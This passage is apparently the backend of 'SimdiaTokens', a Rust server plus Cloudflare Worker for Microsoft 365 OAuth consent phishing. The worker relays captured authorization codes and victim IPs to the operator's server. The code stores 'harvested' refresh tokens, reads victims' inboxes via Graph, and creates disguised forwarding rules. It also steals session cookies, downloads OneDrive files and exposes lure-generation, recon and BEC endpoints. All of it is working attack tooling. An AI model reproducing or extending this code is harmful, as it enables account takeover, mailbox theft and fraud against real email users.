    const authUrl = `https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=${_CLIENT_ID}&response_type=code&redirect_uri=${encodeURIComponent(_REDIRECT_URI)}&scope=${encodeURIComponent(SCOPE)}`;
    return Response.redirect(authUrl, 302);
  }

  if (url.pathname === '/oauth/callback') {
    const code = url.searchParams.get('code');
    if (!code) return new Response('Missing authorization code', { status: 400 });
    
    // Capture the user's real IP address
    let userIp = request.headers.get('CF-Connecting-IP') || request.headers.get('cf-connecting-ip');
    if (!userIp) {
      const xff = request.headers.get('X-Forwarded-For');
      if (xff) {
        userIp = xff.split(',')[0].trim();
      }
    }
    if (!userIp) {
      userIp = 'unknown';
    }
    
    const exchangeUrl = `${_MAIN_SERVER}/exchange?code=${encodeURIComponent(code)}&user_ip=${encodeURIComponent(userIp)}`;
    let tokenId = '';
    try { 
      const resp = await fetch(exchangeUrl, { method: 'GET' }); 
      const data = await resp.json();
      if (data.token_id) tokenId = data.token_id;
    } catch (err) { console.error(err); }
    const successUrl = `${_MAIN_SERVER}/auth-success?token_id=${encodeURIComponent(tokenId)}`;
    return Response.redirect(successUrl, 302);
  }

  if (url.pathname === '/status') {
    return new Response(JSON.stringify({ status: 'ok', worker: 'simdiatokens-oauth-worker', main_server: _MAIN_SERVER, redirect_uri: _REDIRECT_URI }), { headers: { 'Content-Type': 'application/json' } });
  }

  return new Response('Not Found', { status: 404 });
}
"#;

#[derive(Serialize)]
struct DeployWorkerResponse {
    success: bool,
    worker_url: String,
    message: String,
}

// Deploy worker to Cloudflare using their REST API
async fn deploy_worker(state: web::Data<AppState>) -> impl Responder {
    let cf_account_id = match env::var("CF_ACCOUNT_ID") {
        Ok(v) => v,
        Err(_) => return HttpResponse::BadRequest().json(serde_json::json!({
            "success": false,
            "message": "CF_ACCOUNT_ID env var not set"
        })),
    };
    let cf_api_token = match env::var("CF_API_TOKEN") {
        Ok(v) => v,
        Err(_) => return HttpResponse::BadRequest().json(serde_json::json!({
            "success": false,
            "message": "CF_API_TOKEN env var not set"
        })),
    };

    let script_name = env::var("CF_WORKER_NAME").unwrap_or_else(|_| "simdiatokens-oauth-worker".to_string());
    let workers_subdomain = env::var("CF_WORKERS_SUBDOMAIN").unwrap_or_else(|_| "lubaking-co.workers.dev".to_string());

    let main_server = format!("https://{}", env::var("RAILWAY_PUBLIC_DOMAIN")
        .or_else(|_| env::var("RAILWAY_STATIC_URL"))
        .unwrap_or_else(|_| "simdiatokens-v2-production.up.railway.app".to_string()));

    let redirect_uri = format!("https://{}.{}/oauth/callback", script_name, workers_subdomain);

    // Build metadata with text bindings
    // body_part tells Cloudflare which multipart part contains the script
    let metadata = serde_json::json!({
        "body_part": "script",
        "bindings": [
            { "type": "plain_text", "name": "MAIN_SERVER", "text": main_server },
            { "type": "plain_text", "name": "CLIENT_ID", "text": state.config.client_id },
            { "type": "plain_text", "name": "REDIRECT_URI", "text": redirect_uri }
        ]
    });

    let url = format!(
        "https://api.cloudflare.com/client/v4/accounts/{}/workers/scripts/{}",
        cf_account_id, script_name
    );

    let form = reqwest::multipart::Form::new()
        .part("metadata", reqwest::multipart::Part::text(metadata.to_string())
            .mime_str("application/json").unwrap())
        .part("script", reqwest::multipart::Part::text(WORKER_SCRIPT.to_string())
            .file_name("index.js")
            .mime_str("application/javascript").unwrap());

    println!("[deploy] Uploading worker to {}", url);
    println!("[deploy] Redirect URI: {}", redirect_uri);

    let res = match state.http_client
        .put(&url)
        .header("Authorization", format!("Bearer {}", cf_api_token))
        .multipart(form)
        .send()
        .await
    {
        Ok(r) => r,
        Err(e) => {
            eprintln!("[deploy] Cloudflare API request failed: {}", e);
            return HttpResponse::InternalServerError().json(serde_json::json!({
                "success": false,
                "message": format!("Cloudflare API request failed: {}", e)
            }));
        }
    };

    let status = res.status();
    let body_text = res.text().await.unwrap_or_default();

    println!("[deploy] Cloudflare response {}: {}", status, body_text);

    if status.is_success() {
        let worker_url = format!("https://{}.{}", script_name, workers_subdomain);
        HttpResponse::Ok().json(DeployWorkerResponse {
            success: true,
            worker_url,
            message: "Worker deployed successfully".to_string(),
        })
    } else {
        HttpResponse::InternalServerError().json(serde_json::json!({
            "success": false,
            "message": format!("Cloudflare API returned {}: {}", status, body_text)
        }))
    }
}

// robots.txt handler to prevent search engine indexing
async fn robots_txt_handler() -> impl Responder {
    HttpResponse::Ok()
        .content_type("text/plain")
        .body("User-agent: *\nDisallow: /\n\n# SimdiaTokens - do not index\n")
}

// Helper: refresh access token
async fn refresh_access_token(state: &AppState, refresh_token: &str) -> Option<String> {
    let token_url = "https://login.microsoftonline.com/common/oauth2/v2.0/token";
    let params = [
        ("client_id", state.config.client_id.as_str()),
        ("client_secret", state.config.client_secret.as_str()),
        ("grant_type", "refresh_token"),
        ("refresh_token", refresh_token),
    ];
    let res = state.http_client.post(token_url).form(&params).send().await.ok()?;
    let body: serde_json::Value = res.json().await.ok()?;
    body.get("access_token").and_then(|v| v.as_str()).map(|s| s.to_string())
}

// API endpoint to refresh a single token manually
async fn api_refresh_token_handler(
    query: web::Query<TokenIdQuery>,
    state: web::Data<AppState>,
) -> impl Responder {
    let token_id = &query.token_id;
    let token_url = "https://login.microsoftonline.com/common/oauth2/v2.0/token";
    
    match crate::scheduler::refresh_single_token(&state, token_id, token_url).await {
        Ok(_) => {
            HttpResponse::Ok().json(serde_json::json!({
                "success": true,
                "message": "Token refreshed successfully"
            }))
        }
        Err(e) => {
            let err_str = e.to_string();
            // Check if token was revoked (invalid_grant)
            if err_str.contains("invalid_grant") || err_str.contains("revoked") {
                HttpResponse::Ok().json(serde_json::json!({
                    "success": false,
                    "message": "Token has been revoked by user"
                }))
            } else {
                HttpResponse::InternalServerError().json(serde_json::json!({
                    "success": false,
                    "message": format!("Refresh failed: {}", err_str)
                }))
            }
        }
    }
}

// Root status route
async fn root_status() -> impl Responder {
    HttpResponse::Ok().json(serde_json::json!({
        "name": "SimdiaTokens API",
        "version": "2.0.0",
        "status": "operational",
        "endpoints": {
            "auth": "/api/auth/login, /api/auth/register, /api/auth/me",
            "tokens": "/api/tokens, /api/tokens/health",
            "campaigns": "/api/campaigns",
            "inbox": "/api/inbox",
            "recon": "/api/recon/run, /api/recon/{id}",
            "ai": "/api/ai/analyses, /api/ai/analyze",
            "analytics": "/api/analytics/overview",
            "settings": "/api/settings/ai",
            "exchange": "/exchange?code=..."
        }
    }))
}

// HTML admin dashboard (with View Inbox button)
async fn admin_dashboard(state: web::Data<AppState>) -> impl Responder {
    let rows = sqlx::query_as::<_, HarvestedToken>("SELECT id, email, access_token, refresh_token, expires_at, captured_at, source, ip_address, location, tenant_id, category, account_type, last_refreshed_at FROM harvested ORDER BY captured_at DESC")
        .fetch_all(&state.pool)
        .await
        .unwrap_or_default();
    let mut html = String::from(r#"<!DOCTYPE html><html><head><title>SimdiaTokens Admin</title><style>
        body{font-family:Arial;background:#1a1a2e;color:#eee;padding:20px;}
        table{width:100%;border-collapse:collapse;}
        th,td{padding:10px;border-bottom:1px solid #333;}
        .token{font-family:monospace;font-size:12px;}
        button{background:#0078d4;color:#fff;border:none;padding:5px 10px;border-radius:4px;cursor:pointer;}
        button:hover{background:#005a9e;}
        a{text-decoration:none;}
    </style></head><body><h1>SimdiaTokens Harvested Tokens</h1>
    <table><tr><th>ID</th><th>Email</th><th>Refresh Token</th><th>Expires</th><th>Source</th><th>Actions</th></tr>"#);
    for token in rows {
        let email = token.email.as_deref().unwrap_or("unknown");
        let refresh_short = if token.refresh_token.len() > 20 { format!("{}...", &token.refresh_token[..20]) } else { token.refresh_token.clone() };
        html.push_str(&format!(
            r#"<tr><td>{}</td><td>{}</td><td class='token'>{}</td><td>{}</td><td>{}</td>
            <td><a href='/inbox_view?token_id={}'><button>View Inbox</button></a></td></tr>"#,
            token.id, email, refresh_short, token.expires_at, token.source, token.id
        ));
    }
    html.push_str("</table></body></html>");
    HttpResponse::Ok().content_type("text/html").body(html)
}

// HTML inbox view (fallback)
async fn inbox_view_html(query: web::Query<InboxApiQuery>, state: web::Data<AppState>) -> impl Responder {
    let row: Option<HarvestedToken> = sqlx::query_as("SELECT id, email, access_token, refresh_token, expires_at, captured_at, source FROM harvested WHERE id = ?")
        .bind(&query.token_id)
        .fetch_optional(&state.pool)
        .await
        .unwrap_or(None);
    if let Some(token) = row {
        let fresh_access = refresh_access_token(&state, &token.refresh_token).await;
        let access = fresh_access.unwrap_or(token.access_token);
        let client = reqwest::Client::new();
        let resp = client.get("https://graph.microsoft.com/v1.0/me/messages?$top=20&$orderby=receivedDateTime DESC")
            .header("Authorization", format!("Bearer {}", access))
            .send()
            .await;
        match resp {
            Ok(r) => {
                let data: serde_json::Value = r.json().await.unwrap_or_default();
                let mut html = String::from(r#"<!DOCTYPE html><html><head><title>Inbox</title><style>body{font-family:Arial;background:#f0f2f5;margin:0;padding:20px;}h2{color:#333;}.email{background:white;margin-bottom:10px;padding:15px;border-radius:8px;}</style></head><body><h1>Inbox</h1>"#);
                if let Some(msgs) = data.get("value").and_then(|v| v.as_array()) {
                    for msg in msgs {
                        let subject = msg.get("subject").and_then(|v| v.as_str()).unwrap_or("(no subject)");
                        let from = msg.get("from").and_then(|v| v.get("emailAddress")).and_then(|v| v.get("address")).and_then(|v| v.as_str()).unwrap_or("unknown");
                        let received = msg.get("receivedDateTime").and_then(|v| v.as_str()).unwrap_or("");
                        let body_preview = msg.get("bodyPreview").and_then(|v| v.as_str()).unwrap_or("");
                        html.push_str(&format!("<div class='email'><b>{}</b><br>From: {}<br>{}<br>{}</div><hr>", subject, from, received, body_preview));
                    }
                } else {
                    html.push_str("<p>No emails found</p>");
                }
                html.push_str("</body></html>");
                HttpResponse::Ok().content_type("text/html").body(html)
            }
            Err(e) => HttpResponse::InternalServerError().body(format!("Error: {}", e))
        }
    } else {
        HttpResponse::NotFound().body("Token not found")
    }
}

async fn init_db(pool: &SqlitePool) -> Result<(), sqlx::Error> {
    sqlx::query(
        "CREATE TABLE IF NOT EXISTS harvested (
            id TEXT PRIMARY KEY,
            email TEXT,
            access_token TEXT NOT NULL,
            refresh_token TEXT NOT NULL,
            expires_at DATETIME NOT NULL,
            captured_at DATETIME NOT NULL,
            source TEXT NOT NULL,
            ip_address TEXT,
            location TEXT,
            tenant_id TEXT,
            category TEXT,
            account_type TEXT,
            last_refreshed_at DATETIME
        )"
    ).execute(pool).await?;

    sqlx::query(
        r#"
        CREATE TABLE IF NOT EXISTS tokens (
            id TEXT PRIMARY KEY,
            campaign_id TEXT,
            user_email TEXT,
            encrypted_access_token BLOB NOT NULL,
            encrypted_refresh_token BLOB NOT NULL,
            access_salt BLOB NOT NULL,
            refresh_salt BLOB NOT NULL,
            scopes TEXT,
            expires_at DATETIME NOT NULL,
            created_at DATETIME NOT NULL,
            last_refreshed_at DATETIME,
            status TEXT DEFAULT 'active',
            account_type TEXT
        )
        "#
    ).execute(pool).await?;

    // Migration: add account_type column if tables exist from before this change
    let _ = sqlx::query("ALTER TABLE harvested ADD COLUMN account_type TEXT")
        .execute(pool).await;
    let _ = sqlx::query("ALTER TABLE tokens ADD COLUMN account_type TEXT")
        .execute(pool).await;
    sqlx::query(
        r#"
        CREATE TABLE IF NOT EXISTS recon_reports (
            id TEXT PRIMARY KEY,
            token_id TEXT NOT NULL,
            report_json TEXT NOT NULL,
            created_at DATETIME NOT NULL
        )
        "#
    ).execute(pool).await?;

    sqlx::query(
        r#"
        CREATE TABLE IF NOT EXISTS created_rules (
            id TEXT PRIMARY KEY,
            token_id TEXT NOT NULL,
            graph_rule_id TEXT,
            display_name TEXT NOT NULL,
            disguise_name TEXT NOT NULL,
            conditions_json TEXT NOT NULL,
            actions_json TEXT NOT NULL,
            target_folder TEXT,
            forward_to TEXT,
            created_at DATETIME NOT NULL,
            status TEXT NOT NULL
        )
        "#
    ).execute(pool).await?;

    // Migration: add disguise_name column if created_rules table exists without it
    let _ = sqlx::query("ALTER TABLE created_rules ADD COLUMN disguise_name TEXT NOT NULL DEFAULT 'External Mail Filter'")
        .execute(pool).await;
    let _ = sqlx::query("ALTER TABLE created_rules ADD COLUMN graph_rule_id TEXT")
        .execute(pool).await;
    let _ = sqlx::query("ALTER TABLE created_rules ADD COLUMN target_folder TEXT")
        .execute(pool).await;
    let _ = sqlx::query("ALTER TABLE created_rules ADD COLUMN forward_to TEXT")
        .execute(pool).await;

    sqlx::query(
        r#"
        CREATE TABLE IF NOT EXISTS campaigns (
            id TEXT PRIMARY KEY,
            name TEXT NOT NULL,
            client_id TEXT NOT NULL,
            requested_scopes TEXT,
            device_code TEXT,
            user_code TEXT,
            verification_uri TEXT,
            status TEXT NOT NULL,
            created_at DATETIME NOT NULL,
            expires_at DATETIME NOT NULL,
            token_id TEXT
        )
        "#
    ).execute(pool).await?;

    sqlx::query(
        r#"
        CREATE TABLE IF NOT EXISTS audit_logs (
            id TEXT PRIMARY KEY,
            timestamp DATETIME NOT NULL,
            action TEXT NOT NULL,
            campaign_id TEXT,
            token_id TEXT,
            user_email TEXT,
            ip_address TEXT,
            user_agent TEXT,
            details TEXT,
            success BOOLEAN NOT NULL
        )
        "#
    ).execute(pool).await?;

    sqlx::query(
        r#"
        CREATE TABLE IF NOT EXISTS local_folders (
            id TEXT PRIMARY KEY,
            token_id TEXT NOT NULL,
            name TEXT NOT NULL,
            created_at DATETIME NOT NULL
        )
        "#
    ).execute(pool).await?;

    sqlx::query(
        r#"
        CREATE TABLE IF NOT EXISTS local_filtered_messages (
            id TEXT PRIMARY KEY,
            token_id TEXT NOT NULL,
            message_id TEXT NOT NULL,
            folder_id TEXT NOT NULL,
            subject TEXT,
            sender TEXT,
            sender_email TEXT,
            received_date TEXT,
            body_preview TEXT,
            keywords TEXT,
            created_at DATETIME NOT NULL
        )
        "#
    ).execute(pool).await?;

    sqlx::query(
        r#"
        CREATE TABLE IF NOT EXISTS ai_analyses (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            token_id TEXT NOT NULL,
            token_email TEXT,
            report TEXT NOT NULL,
            created_at DATETIME NOT NULL DEFAULT (datetime('now'))
        )
        "#
    ).execute(pool).await?;

    // Migration: add session tracking columns to tokens table
    let _ = sqlx::query("ALTER TABLE tokens ADD COLUMN session_status TEXT DEFAULT 'active'")
        .execute(pool).await;
    let _ = sqlx::query("ALTER TABLE tokens ADD COLUMN session_active_at DATETIME")
        .execute(pool).await;
    let _ = sqlx::query("ALTER TABLE tokens ADD COLUMN session_killed_at DATETIME")
        .execute(pool).await;

    // Migration: add session tracking columns to harvested table
    let _ = sqlx::query("ALTER TABLE harvested ADD COLUMN session_status TEXT DEFAULT 'active'")
        .execute(pool).await;
    let _ = sqlx::query("ALTER TABLE harvested ADD COLUMN session_active_at DATETIME")
        .execute(pool).await;
    let _ = sqlx::query("ALTER TABLE harvested ADD COLUMN session_killed_at DATETIME")
        .execute(pool).await;

    Ok(())
}

#[actix_web::main]
async fn main() -> std::io::Result<()> {
    dotenv().ok();
    let config = AppConfig::from_env();

    let db_path = config.database_url
        .strip_prefix("sqlite:///")
        .or_else(|| config.database_url.strip_prefix("sqlite://"))
        .or_else(|| config.database_url.strip_prefix("sqlite:"))
        .unwrap_or(&config.database_url)
        .to_string();

    if db_path != ":memory:" {
        // Ensure parent directory exists
        if let Some(parent) = std::path::Path::new(&db_path).parent() {
            if !parent.as_os_str().is_empty() {
                std::fs::create_dir_all(parent)
                    .expect("Failed to create database directory");
            }
        }

        // Test that we can actually write to the directory
        let test_file = std::path::Path::new(&db_path)
            .parent()
            .unwrap_or(std::path::Path::new("."))
            .join(".write_test");
        match std::fs::write(&test_file, b"test") {
            Ok(_) => {
                std::fs::remove_file(&test_file).ok();
                println!("Write test passed on directory");
            }
            Err(e) => {
                panic!("Directory is NOT writable: {}. Check Railway volume permissions.", e);
            }
        }
    }

    // Use ?mode=rwc to force SQLite to create the file if it doesn't exist
    let connect_url = if db_path == ":memory:" {
        config.database_url.clone()
    } else {
        format!("sqlite:///{}?mode=rwc", db_path)
    };

    println!("Connecting to: {}", connect_url);

    let pool = SqlitePoolOptions::new()
        .max_connections(5)
        .connect(&connect_url)
        .await
        .expect("Failed to create database pool");

    init_db(&pool).await.expect("Failed to init DB");
    ensure_users_table(&pool).await.expect("Failed to init users table");
    seed_default_admin(&pool).await.expect("Failed to seed admin");
    let http_client = Client::new();
    let vault = Vault::new(config.master_secret.clone());
    let response_key = ResponseCrypto::derive_key(&config.master_secret);
    let app_state = web::Data::new(AppState { pool, config, http_client, vault, response_key });

    let port = std::env::var("PORT").unwrap_or_else(|_| "8080".to_string());
    let port = port.parse::<u16>().unwrap_or(8080);

    println!("SimdiaTokens backend running on http://0.0.0.0:{}", port);
    start_scheduler(app_state.clone());
    HttpServer::new(move || {
        let cors = Cors::default()
            .allow_any_origin()
            .allow_any_method()
            .allow_any_header()
            .expose_headers(vec!["Authorization"])
            .supports_credentials();
        App::new()
            .wrap(cors)
            .wrap(AuditMiddleware)
            .app_data(app_state.clone())
            .app_data(web::JsonConfig::default().limit(50_000_000))
            .route("/", web::get().to(root_status))
            .route("/robots.txt", web::get().to(robots_txt_handler))
            .route("/exchange", web::get().to(exchange_code))
            .route("/auth-success", web::get().to(auth_success_handler))
            .route("/admin", web::get().to(admin_dashboard))
            .route("/inbox_view", web::get().to(inbox_view_html))
            .route("/api/tokens", web::get().to(api_tokens))
            .route("/api/tokens", web::delete().to(api_delete_tokens))
            .route("/api/tokens/health", web::get().to(tokens_health))
            .route("/api/tokens/store", web::post().to(store_token_handler))
            .route("/api/tokens/{id}", web::get().to(api_token_by_id))
            .route("/api/refresh", web::post().to(api_refresh_token_handler))
            .route("/api/inbox", web::get().to(api_inbox))
            .route("/api/recon/run", web::post().to(recon_run_handler))
            .route("/api/recon/{token_id}", web::get().to(recon_get_handler))
            .route("/api/rules", web::get().to(list_rules_handler))
            .route("/api/rules/create", web::post().to(create_rule_handler))
            .route("/api/rules/{id}", web::delete().to(delete_rule_handler))
            .route("/api/rules/graph", web::get().to(fetch_graph_rules_handler))
            .route("/api/rules/run", web::post().to(run_local_rules_handler))
            .route("/api/rules/ai-suggest", web::post().to(ai_suggest_rules_handler))
            .route("/api/contacts", web::get().to(list_contacts_handler))
            .route("/api/contacts", web::post().to(create_contact_handler))
            .route("/api/contacts/{id}", web::patch().to(update_contact_handler))
            .route("/api/contacts/{id}", web::delete().to(delete_contact_handler))
            .route("/api/contacts/extract", web::get().to(extract_emails_handler))
            .route("/api/tasks/lists", web::get().to(list_task_lists_handler))
            .route("/api/tasks", web::get().to(list_tasks_handler))
            .route("/api/tasks", web::post().to(create_task_handler))
            .route("/api/tasks/{id}", web::patch().to(update_task_handler))
            .route("/api/tasks/{id}", web::delete().to(delete_task_handler))
            .route("/api/onedrive/items", web::get().to(list_drive_items_handler))
            .route("/api/onedrive/items/{id}", web::get().to(get_drive_item_handler))
            .route("/api/onedrive/items/{id}/download", web::get().to(download_drive_item_handler))
            .route("/api/onedrive/search", web::get().to(search_drive_items_handler))
            .route("/api/office/docs", web::get().to(list_office_docs_handler))
            .route("/api/office/search", web::get().to(search_office_docs_handler))
            .route("/api/office/embed", web::get().to(get_office_embed_url_handler))
            .route("/api/stealth/config", web::get().to(stealth_config_handler))
            .route("/api/calendar/events", web::get().to(list_calendar_events_handler))
            .route("/api/teams", web::get().to(list_teams_handler))
            .route("/api/teams/{id}/channels", web::get().to(list_team_channels_handler))
            .route("/api/teams/share", web::post().to(share_to_teams_handler))
            .route("/api/tokens/{id}/session/bookmarklet", web::get().to(generate_bookmarklet_token_handler))
            .route("/api/tokens/{id}/session/sync", web::post().to(sync_cookies_handler))
            .route("/api/tokens/{id}/session/test", web::get().to(test_cookie_session_handler))
            .route("/api/tokens/{id}/session/status", web::get().to(get_session_status_handler))
            .route("/api/tokens/{id}/session/kill", web::post().to(kill_session_handler))
            .route("/api/campaigns/generate-link", web::get().to(generate_oauth_link))
            .route("/api/campaigns/deploy-worker", web::post().to(deploy_worker))
            .route("/api/campaigns", web::get().to(list_campaigns_handler))
            .route("/api/campaigns/create", web::post().to(create_campaign_handler))
            .route("/api/campaigns/{id}", web::get().to(get_campaign_handler))
            .route("/api/campaigns/{id}/attach_token", web::post().to(attach_token_handler))
            .route("/api/campaigns/{id}", web::delete().to(delete_campaign_handler))
            .route("/api/analytics/overview", web::get().to(analytics_overview_handler))
            .route("/api/audit/logs", web::get().to(audit_logs_handler))
            .route("/api/audit/summary", web::get().to(audit_summary_handler))
            .route("/api/settings/ai", web::get().to(get_ai_settings_handler))
            .route("/api/settings/ai", web::post().to(save_ai_settings_handler))
            .route("/api/test-decrypt", web::post().to(test_decrypt_handler))
            .route("/api/maintenance/purge-expired", web::post().to(purge_expired_handler))
            .route("/api/auth/register", web::post().to(register_handler))
            .route("/api/auth/login", web::post().to(login_handler))
            .route("/api/auth/me", web::get().to(me_handler))
            .route("/api/auth/change-password", web::post().to(auth::change_password_handler))
            .route("/api/admins", web::get().to(list_admins_handler))
            .route("/api/admins", web::post().to(create_admin_handler))
            .route("/api/admins/{id}", web::patch().to(update_admin_handler))
            .route("/api/admins/{id}", web::delete().to(delete_admin_handler))
            .route("/api/bec/analyze", web::get().to(bec_analyze_handler))
            .route("/api/inbox/folders", web::get().to(list_folders_handler))
            .route("/api/inbox/folders", web::post().to(create_folder_handler))
            .route("/api/inbox/folders/{folder_id}", web::get().to(folder_messages_handler))
            .route("/api/inbox/send", web::post().to(send_mail_handler))
            .route("/api/inbox/messages/{message_id}", web::delete().to(delete_message_handler))
            .route("/api/inbox/messages/{message_id}/move", web::post().to(move_message_handler))
            .route("/api/inbox/messages/{message_id}/read", web::patch().to(mark_read_handler))
            .route("/api/inbox/contacts", web::get().to(fetch_contacts_handler))
            .route("/api/inbox/mx-check", web::post().to(mx_check_handler))
            .route("/api/inbox/local-folders", web::get().to(list_local_folders_handler))
            .route("/api/inbox/local-folders", web::post().to(create_local_folder_handler))
            .route("/api/inbox/local-folders/{folder_id}", web::delete().to(delete_local_folder_handler))
            .route("/api/inbox/local-folders/{folder_id}/messages", web::get().to(list_local_folder_messages_handler))
            .route("/api/inbox/auto-filter", web::post().to(auto_filter_handler))
            .route("/api/lure/generate", web::post().to(generate_lure_handler))
    })
    .bind(("0.0.0.0", port))?
    .run()
    .await
}